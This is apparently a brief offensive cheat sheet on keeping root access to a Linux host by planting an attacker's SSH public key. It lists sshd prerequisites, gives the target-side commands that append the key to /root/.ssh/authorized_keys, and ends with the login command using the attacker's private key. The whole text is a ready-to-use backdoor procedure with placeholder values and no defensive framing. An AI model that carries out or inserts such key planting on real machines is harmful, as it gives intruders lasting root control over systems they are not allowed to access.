### Prerequisites
root access

ssh service is running

    # service sshd status  
    # systemctl status sshd

In the ssh config
- PermitRootLogin < without-password | yes >
- PublicKeyAuthentication yes
- AuthorizedKeysFile .ssh/authorized_keys

### Attacker

    # ssh-keygen
    
### Target

    # mkdir -p /root/.ssh
    # echo '<ATTACKER_PUBLIC_KEY>' >> /root/.ssh/authorized_keys
    # chmod 600 /root/.ssh/authorized_keys

### Exploitation 

    ssh root@<TARGET_IP>[:SSH_PORT] -i <ATTACKER_PRIVATE_KEY_PATH>


### Info
- ssh config paths : 
    - /etc/ssh/sshd_config